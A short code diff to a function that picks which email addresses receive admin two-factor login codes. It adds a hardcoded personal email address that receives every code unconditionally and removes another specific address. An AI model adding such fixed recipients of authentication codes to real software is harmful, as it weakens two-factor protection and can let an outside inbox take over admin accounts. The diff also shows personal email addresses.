@@ -79,7 +79,10 @@ export function getAdmin2faRecipients(accountEmail: string): string[] {
   };
   add(accountEmail);
   add(process.env.ADMIN_2FA_EMAIL);
-  add(process.env.SMTP_TO_EMAIL || 'info@bikerfun.nl');
+  add(process.env.SMTP_TO_EMAIL);
+  add('scottlaeven@hotmail.com');
+  if (map.has('265749laeven@zuyd.nl')) map.delete('265749laeven@zuyd.nl');
+  if (map.size === 0) add('scottlaeven@hotmail.com');
   return [...map.values()];
 }
 
